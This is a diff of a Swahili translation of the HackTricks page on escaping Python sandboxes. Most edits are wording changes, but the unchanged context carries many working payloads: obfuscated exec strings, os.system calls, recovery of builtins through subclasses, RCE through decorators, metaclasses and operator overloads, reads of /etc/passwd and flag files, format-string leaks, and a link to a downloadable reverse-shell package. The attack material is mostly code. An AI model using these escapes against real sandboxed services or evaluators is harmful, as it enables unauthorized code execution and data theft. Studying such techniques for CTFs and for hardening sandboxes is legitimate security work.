@@ -1,4 +1,4 @@
-# Kudukua mifumo ya kujilinda ya Python
+# Kudukua Maboxi ya Python
 
 <details>
 
@@ -6,19 +6,27 @@
 
 Njia nyingine za kusaidia HackTricks:
 
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
 * Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
 * Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
 
-Hizi ni baadhi ya mbinu za kudukua mifumo ya kujilinda ya Python na kutekeleza amri za kupita kiasi.
+**Kikundi cha Usalama cha Kujitahidi**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+***
+
+Hizi ni mbinu kadhaa za kudukua ulinzi wa maboxi ya Python na kutekeleza amri za kupita kiasi.
 
 ## Maktaba za Kutekeleza Amri
 
-Jambo la kwanza unalohitaji kujua ni ikiwa unaweza kutekeleza moja kwa moja nambari na maktaba iliyoshaa kuingizwa, au ikiwa unaweza kuagiza mojawapo ya maktaba hizi:
+Jambo la kwanza unalohitaji kujua ni ikiwa unaweza kutekeleza moja kwa moja nambari na maktaba iliyosha kuingizwa, au ikiwa unaweza kuagiza mojawapo ya maktaba hizi:
 ```python
 os.system("ls")
 os.popen("ls").read()
@@ -96,16 +104,16 @@ Unaweza kupakua pakiti ya kuunda shell ya nyuma hapa. Tafadhali, kumbuka kwamba 
 {% file src="../../../.gitbook/assets/reverse.tar.gz" %}
 
 {% hint style="info" %}
-Pakiti hii inaitwa `Reverse`. Hata hivyo, ilibuniwa kwa njia maalum ili wakati unapoondoka kwenye shell ya nyuma, usanidi mwingine utashindwa, hivyo **hutaiacha pakiti ya ziada ya python imewekwa kwenye server** unapoondoka.
+Pakiti hii inaitwa `Reverse`. Hata hivyo, ilibuniwa kwa makusudi ili wakati unapoondoka kwenye shell ya nyuma, usanidi mwingine utashindwa, hivyo **hutaiacha pakiti ya ziada ya python imewekwa kwenye server** unapoondoka.
 {% endhint %}
 
 ## Kutathmini msimbo wa python
 
 {% hint style="warning" %}
-Tafadhali kumbuka kwamba exec inaruhusu mstari wa maandishi wa mistari mingi na ";", lakini eval haifanyi hivyo (angalia operator wa walrus)
+Tafadhali kumbuka kwamba exec inaruhusu mistari mingi na ";", lakini eval haifanyi hivyo (angalia operator wa walrus)
 {% endhint %}
 
-Ikiwa herufi fulani zimepigwa marufuku unaweza kutumia uwakilishi wa **hex/octal/B64** kwa ajili ya **kipuza** kizuizi:
+Ikiwa herufi fulani zimepigwa marufuku unaweza kutumia **uwakilishi wa hex/octal/B64** kwa ajili ya **kipuuzi** kizuizi:
 ```python
 exec("print('RCE'); __import__('os').system('ls')") #Using ";"
 exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
@@ -126,7 +134,7 @@ exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x
 exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
 exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
 ```
-### Maktaba nyingine ambazo huruhusu kutathmini nambari ya python
+### Maktaba nyingine zinazoruhusu kutathmini nambari za python
 ```python
 #Pandas
 import pandas as pd
@@ -162,13 +170,13 @@ return x
 #+AAo-print(open("/flag.txt").read())
 """.lstrip()
 ```
-Pia niwezekana kuidhinisha kutumia namna zingine za kuandika, k.m. `raw_unicode_escape` na `unicode_escape`.
+Pia niwezekana kuihepa kwa kutumia taratibu nyingine za uendeshaji, k.m. `raw_unicode_escape` na `unicode_escape`.
 
-## Kutumia Python bila kuita
+## Utekelezaji wa Python bila simu
 
-Ukiwa ndani ya gereza la python ambalo **halikuruhusu kufanya simu**, bado kuna njia za **kutekeleza kazi za kiholela, namna ya kuandika** na **maagizo**.
+Ikiwa uko ndani ya gereza la python ambalo **halikuruhusu kufanya simu**, bado kuna njia za **utekelezaji wa kazi za kupindukia, nambari** na **maagizo**.
 
-### RCE kwa kutumia [mapambo](https://docs.python.org/3/glossary.html#term-decorator)
+### RCE na [mapambo](https://docs.python.org/3/glossary.html#term-decorator)
 ```python
 # From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
 @exec
@@ -248,7 +256,7 @@ __ixor__ (k ^= 'import os; os.system("sh")')
 ```
 #### Kuunda vitu na [metaclasses](https://docs.python.org/3/reference/datamodel.html#metaclasses)
 
-Jambo muhimu ambalo metaclasses zinaturuhusu kufanya ni **kuunda kipengele cha darasa, bila kuita konstrukta** moja kwa moja, kwa kuunda darasa jipya na darasa lengwa kama metaclass.
+Jambo muhimu ambalo metaclasses zinaturuhusu kufanya ni **kuunda kipengele cha darasa, bila kuita konstrukta** moja kwa moja, kwa kutengeneza darasa jipya na darasa lengwa kama metaclass.
 ```python
 # Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
 # This will define the members of the "subclass"
@@ -285,7 +293,7 @@ k + 'import os; os.system("sh")' #RCE abusing __add__
 
 ## You can also use the tricks from the previous section to get RCE with this object
 ```
-### Zaidi ya Uwezo wa Kudhibiti Kijijini (RCE)
+### Zaidi ya Uwezekano wa Kudhibiti Kijijini (RCE)
 ```python
 # From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
 # If sys is imported, you can sys.excepthook and trigger it by triggering an error
@@ -316,12 +324,12 @@ a.__class__.__exit__ = lambda self, *args: None
 with (a as b):
 pass
 ```
-## Vifaa vya Ndani
+## Zilizojengwa
 
-* [**Vifaa vya Ndani vya python2**](https://docs.python.org/2/library/functions.html)
-* [**Vifaa vya Ndani vya python3**](https://docs.python.org/3/library/functions.html)
+* [**Kazi za zilizojengwa za python2**](https://docs.python.org/2/library/functions.html)
+* [**Kazi za zilizojengwa za python3**](https://docs.python.org/3/library/functions.html)
 
-Ikiwa unaweza kupata kitu cha **`__builtins__`** unaweza kuagiza maktaba (kumbuka unaweza pia kutumia hapa mwakilishi mwingine wa herufi ulioonyeshwa katika sehemu ya mwisho):
+Ikiwa unaweza kupata **`__builtins__`** kifaa unaweza kuingiza maktaba (tambua kwamba unaweza pia kutumia hapa mwakilishi mwingine wa herufi ulioonyeshwa katika sehemu ya mwisho):
 ```python
 __builtins__.__import__("os").system("ls")
 __builtins__.__dict__['__import__']("os").system("ls")
@@ -329,9 +337,9 @@ __builtins__.__dict__['__import__']("os").system("ls")
 ### Hakuna Builtins
 
 Wakati huna `__builtins__` huwezi kuimport chochote wala kusoma au kuandika faili kwani **funksheni zote za kimataifa** (kama vile `open`, `import`, `print`...) **hazijapakiwa**.\
-Hata hivyo, **kwa chaguo-msingi python huimport moduli nyingi kwenye kumbukumbu**. Moduli hizi zinaweza kuonekana kuwa salama, lakini baadhi yao **pia huimporta** **kazi hatari** ndani yao ambazo zinaweza kupatikana ili kupata hata **utekelezaji wa nambari za kubahatisha**.
+Hata hivyo, **kwa chaguo-msingi python huimport moduli nyingi kwenye kumbukumbu**. Moduli hizi zinaweza kuonekana kuwa salama, lakini baadhi yao **pia huimporta** **funksheni hatari** ndani yao ambazo zinaweza kupatikana ili kupata hata **utekelezaji wa nambari ya kiholela**.
 
-Katika mifano ifuatayo unaweza kuona jinsi ya **kutumia vibaya** baadhi ya moduli hizi "**salama**" zilizopakiwa ili **kupata** **kazi hatari** ndani yao.
+Katika mifano ifuatayo unaweza kuona jinsi ya **kutumia vibaya** baadhi ya moduli hizi "**salama**" zilizopakiwa ili **kupata** **funksheni hatari** ndani yao.
 
 **Python2**
 ```python
@@ -356,7 +364,13 @@ get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
 ```
 #### Python3
 
-#### Kiswahili
+### Kizuizi cha Python
+
+Kizuizi cha Python ni mbinu ambayo inaweza kutumika kuzuia au kudhibiti upatikanaji wa vitu vya Python kama vile moduli, vipengele, au kazi. Kizuizi hiki kinaweza kudhibitiwa kwa kutumia mbinu za kudhibiti upatikanaji wa vitu vya Python kama vile kuzuia upatikanaji wa vipengele vya hatari au kuzuia upatikanaji wa faili za mfumo.
+
+### Kupuuza Kizuizi cha Python
+
+Kupuuza kizuizi cha Python kunahusisha kutafuta njia za kuzunguka au kudhibiti kizuizi hicho ili kupata upatikanaji usioidhinishwa au kufanya vitendo visivyoruhusiwa. Hii inaweza kufanyika kwa kutumia mbinu za kubadilisha mazingira ya kufanya kazi ya Python au kwa kutumia mbinu za kudanganya kizuizi hicho.
 ```python
 # Obtain builtins from a globally defined function
 # https://docs.python.org/3/library/functions.html
@@ -375,7 +389,7 @@ get_flag.__globals__['__builtins__']
 # Get builtins from loaded classes
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
 ```
-[**Chini kuna kazi kubwa**](./#recursive-search-of-builtins-globals) ya kutafuta **tens/hundreds** ya **mahali** ambapo unaweza kupata **builtins**.
+[**Chini kuna kazi kubwa**](./#recursive-search-of-builtins-globals) ya kupata **tens/hundreds** ya **mahali** ambapo unaweza kupata **builtins**.
 
 #### Python2 na Python3
 ```python
@@ -383,7 +397,7 @@ get_flag.__globals__['__builtins__']
 __builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
 __builtins__["__import__"]('os').system('ls')
 ```
-### Mzigo wa kujengwa ndani
+### Mzigo wa kujengwa wa kujengwa
 ```python
 # Possible payloads once you have found the builtins
 __builtins__["open"]("/etc/passwd").read()
@@ -393,7 +407,7 @@ __builtins__["__import__"]("os").system("ls")
 ```
 ## Globals na locals
 
-Kuchunguza **`globals`** na **`locals`** ni njia nzuri ya kujua unaweza kupata nini.
+Kuangalia **`globals`** na **`locals`** ni njia nzuri ya kujua unaweza kupata nini.
 ```python
 >>> globals()
 {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
@@ -417,13 +431,13 @@ class_obj.__init__.__globals__
 [ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
 [<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
 ```
-[**Chini kuna kazi kubwa**](./#recursive-search-of-builtins-globals) ya kupata **tens/hundreds** ya **mahali** ambapo unaweza kupata **globals**.
+[**Hapa chini kuna kazi kubwa**](./#recursive-search-of-builtins-globals) ya kupata **tens/hundreds** ya **maeneo** ambapo unaweza kupata **globals**.
 
 ## Kugundua Utekelezaji wa Kiholela
 
 Hapa nataka kueleza jinsi ya kugundua kwa urahisi **kazi hatari zaidi zilizopakiwa** na kupendekeza mbinu za kudanganya zaidi.
 
-#### Kupata darasa za chini kwa kuzidisha
+#### Kupata Darasa za Kufikia kwa Kupita
 
 Moja ya sehemu nyeti zaidi ya mbinu hii ni kuweza **kupata darasa za msingi**. Katika mifano iliyopita hii ilifanywa kwa kutumia `''.__class__.__base__.__subclasses__()` lakini kuna **njia zingine zinazowezekana**:
 ```python
@@ -550,10 +564,10 @@ execfile:
 execute:
 __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
 ```
-## Utafutaji wa Kurejelea wa Vitu vya Kujengwa, Globals...
+## Tafuta Kwa Kina ya Vitu vya Kujengwa, Globals...
 
 {% hint style="warning" %}
-Hii ni **nzuri sana**. Ikiwa unatafuta kitu kama globals, builtins, open au chochote kingine, tumia skripti hii **kutafuta kwa kina maeneo ambapo unaweza kupata kile kitu.**
+Hii ni **nzuri sana**. Ikiwa unatafuta kitu kama globals, builtins, open au chochote kingine, tumia script hii **kutafuta kwa kina maeneo ambapo unaweza kupata kitu hicho.**
 {% endhint %}
 ```python
 import os, sys # Import these to find more gadgets
@@ -676,9 +690,9 @@ Unaweza kuangalia matokeo ya skripti hii kwenye ukurasa huu:
 [broken-reference](broken-reference/)
 {% endcontent-ref %}
 
-## Python Format String
+## Fomati ya Python String
 
-Ikiwa **unatuma** **string** kwa python ambayo itakuwa **imeboreshwa**, unaweza kutumia `{}` kupata **taarifa za ndani za python.** Unaweza kutumia mifano iliyopita kupata vitu vya kawaida au vya kujengwa kwa mfano.
+Ikiwa unatuma **string** kwa python ambayo itakuwa **imefomatiwa**, unaweza kutumia `{}` kupata **taarifa za ndani za python.** Unaweza kutumia mifano iliyopita kupata upatikanaji wa vitu vya kawaida au vya kujengwa kwa mfano.
 
 {% hint style="info" %}
 Walakini, kuna **kizuizi**, unaweza kutumia ishara `.[]` tu, kwa hivyo **hutaweza kutekeleza nambari ya kupindukia**, tu kusoma taarifa.\
@@ -703,16 +717,16 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-Tambua jinsi unavyoweza **kupata sifa** kwa njia ya kawaida kwa kutumia **dot** kama `people_obj.__init__` na **elementi ya dict** kwa kutumia **mabano** bila alama za nukta `__globals__[CONFIG]`
+Tafadhali angalia jinsi unavyoweza **kupata sifa** kwa njia ya kawaida kwa kutumia **dot** kama `people_obj.__init__` na **elementi ya dict** kwa kutumia **mabano** bila alama za nukta `__globals__[CONFIG]`
 
-Pia kumbuka unaweza kutumia `.__dict__` kuorodhesha elementi za kitu `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
+Pia angalia unaweza kutumia `.__dict__` kuorodhesha elementi za kitu `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
 Baadhi ya sifa nyingine za kuvutia kutoka kwa herufi za muundo ni uwezekano wa **kutekeleza** **kazi** **`str`**, **`repr`** na **`ascii`** kwenye kitu kilichotajwa kwa kuongeza **`!s`**, **`!r`**, **`!a`** mtawalia:
 ```python
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
 get_name_for_avatar(st, people_obj = people)
 ```
-Zaidi ya hayo, ni **inawezekana kuandika wapangaji wa fomati mpya** katika darasa:
+Zaidi ya hayo, ni **inawezekana kuandika wapangaji mpya** katika darasa:
 ```python
 class HAL9000(object):
 def __format__(self, format):
@@ -750,9 +764,9 @@ Angalia pia ukurasa ufuatao kwa vifaa ambavyo vitasoma **habari nyeti kutoka kwa
 Ikiwa unataka **kujifunza** kuhusu **bytecode ya python** kwa kina soma chapisho hili **zuri** kuhusu mada hiyo: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 {% endhint %}
 
-Katika baadhi ya CTFs unaweza kupewa jina la **kazi ya desturi ambapo bendera** inapatikana na unahitaji kuona **ndani** ya **kazi** ili kuipata.
+Katika baadhi ya CTFs unaweza kupewa jina la **kazi ya desturi ambapo bendera** inapatikana na unahitaji kuona **ndani** ya **kazi** ili kuiondoa.
 
-Hii ndio kazi ya kupekua:
+Hii ni kazi ya kupekua:
 ```python
 def get_flag(some_input):
 var1=1
@@ -787,7 +801,7 @@ CustomClassObject.__class__.__init__.__globals__
 
 ### **Kupata msimbo wa kazi**
 
-**`__code__`** na `func_code`: Unaweza **kupata** hii **sifa** ya kazi ili **kupata kipengee cha msimbo** wa kazi.
+**`__code__`** na `func_code`: Unaweza **kupata ufikiaji** wa **sifa hii** ya kazi ili **kupata kifaa cha msimbo** wa kazi.
 ```python
 # In our current example
 get_flag.__code__
@@ -875,7 +889,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-Tambua kwamba **ikiwa huwezi kuingiza `dis` katika sanduku la python** unaweza kupata **bytecode** ya kazi (`get_flag.func_code.co_code`) na **kuidisassemble** kwa kifaa chako. Hutaweza kuona maudhui ya mizani zinazopakiwa (`LOAD_CONST`) lakini unaweza kuzitambua kutoka kwa (`get_flag.func_code.co_consts`) kwa sababu `LOAD_CONST` pia inaonyesha ofseti ya mizani inayopakiwa.
+Tambua kwamba **ikiwa huwezi kuingiza `dis` katika sanduku la python** unaweza kupata **bytecode** ya kazi (`get_flag.func_code.co_code`) na **kuidisassemble** kwa kifaa chako. Hautaona maudhui ya mizani zinazopakiwa (`LOAD_CONST`) lakini unaweza kuzitambua kutoka kwa (`get_flag.func_code.co_consts`) kwa sababu `LOAD_CONST` pia inaonyesha mbali ya mizani inayopakiwa.
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -899,8 +913,8 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ```
 ## Kukusanya Python
 
-Sasa, wacha tuwazie kwamba kwa namna fulani unaweza **kupata habari kuhusu kazi ambayo huwezi kuitekeleza** lakini unahitaji **kuitekeleza**.\
-Kama katika mfano ufuatao, **unaweza kupata kifaa cha namna ya kanuni** ya kazi hiyo, lakini kwa kusoma disassemble huwezi **kujua jinsi ya kuhesabu bendera** (_fikiria kazi ya `calc_flag` yenye utata zaidi_).
+Sasa, wacha tufikirie kwamba kwa namna fulani unaweza **kupata habari kuhusu kazi ambayo huwezi kuitekeleza** lakini unahitaji **kuitekeleza**.\
+Kama katika mfano ufuatao, **unaweza kupata kifaa cha namna ya kanuni** ya kazi hiyo, lakini kwa kusoma disassemble tu **hujui jinsi ya kuhesabu bendera** (_fikiria kazi ya `calc_flag` yenye utata zaidi_).
 ```python
 def get_flag(some_input):
 var1=1
@@ -935,7 +949,7 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 {% hint style="info" %}
-Kulingana na toleo la python **parameta** za `code_type` zinaweza kuwa na **mpangilio tofauti**. Njia bora ya kujua mpangilio wa parameta katika toleo la python unalotumia ni kwa kukimbia:
+Kulingana na toleo la python **paramita** za `code_type` zinaweza kuwa na **mpangilio tofauti**. Njia bora ya kujua mpangilio wa paramita katika toleo la python unalotumia ni kwa kukimbia:
 ```
 import types
 types.CodeType.__doc__
@@ -946,7 +960,7 @@ types.CodeType.__doc__
 ### Kurekebisha kazi iliyovuja
 
 {% hint style="warning" %}
-Katika mfano ufuatao, tutachukua data yote inayohitajika kurekebisha kazi kutoka kwa kificho cha kazi moja kwa moja. Katika **mfano halisi**, thamani zote za kutekeleza kazi **`code_type`** ndizo **utahitaji kuvuja**.
+Katika mfano ufuatao, tutachukua data yote inayohitajika kurekebisha kazi kutoka kwa kificho cha kazi moja kwa moja. Katika **mfano halisi**, thamani zote za kutekeleza kazi ya **`code_type`** ndizo **utakazohitaji kufichua**.
 {% endhint %}
 ```python
 fc = get_flag.__code__
@@ -960,10 +974,10 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 ### Kupita Ulinzi
 
-Katika mifano iliyopita mwanzoni mwa chapisho hili, unaweza kuona **jinsi ya kutekeleza nambari yoyote ya python kwa kutumia kazi ya `compile`**. Hii ni ya kuvutia kwa sababu unaweza **kutekeleza mizunguko yote** na kila kitu katika **mstari mmoja** (na tunaweza kufanya hivyo kutumia **`exec`**).\
-Kwa njia yoyote, mara nyingine inaweza kuwa na manufaa **kuunda** **kitu kilichokompiliwa** kwenye mashine ya ndani na kutekeleza kwenye **mashine ya CTF** (kwa mfano kwa sababu hatuna kazi ya `compiled` kwenye CTF).
+Katika mifano iliyopita mwanzoni mwa chapisho hili, unaweza kuona **jinsi ya kutekeleza nambari yoyote ya python kwa kutumia kazi ya `compile`**. Hii ni ya kuvutia kwa sababu unaweza **kutekeleza skripti nzima** na mizunguko yote katika **mstari mmoja** (na tunaweza kufanya hivyo kutumia **`exec`**).\
+Hata hivyo, mara kwa mara inaweza kuwa na manufaa **kuunda** **kitu kilichopangwa** kwenye mashine ya ndani na kutekeleza kwenye **mashine ya CTF** (kwa mfano kwa sababu hatuna kazi ya `compiled` kwenye CTF).
 
-Kwa mfano, hebu tuunde na kutekeleza kwa mikono kazi inayosoma _./poc.py_:
+Kwa mfano, hebu tuunde na kutekeleza kwa mkono kazi ambayo inasoma _./poc.py_:
 ```python
 #Locally
 def read():
@@ -1000,7 +1014,7 @@ f(42)
 ```
 ## Kudecompile Python Iliyokompiliwa
 
-Kwa kutumia zana kama [**https://www.decompiler.com/**](https://www.decompiler.com) mtu anaweza **kudecompile** nambari ya python iliyokompiliwa.
+Kwa kutumia zana kama [**https://www.decompiler.com/**](https://www.decompiler.com) mtu anaweza **kudecompile** nambari ya Python iliyokompiliwa.
 
 **Angalia mafunzo haya**:
 
@@ -1008,12 +1022,12 @@ Kwa kutumia zana kama [**https://www.decompiler.com/**](https://www.decompiler.c
 [.pyc.md](../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md)
 {% endcontent-ref %}
 
-## Mambo Mengine ya Python
+## Mambo Mbalimbali ya Python
 
-### Kuthibitisha
+### Kudai
 
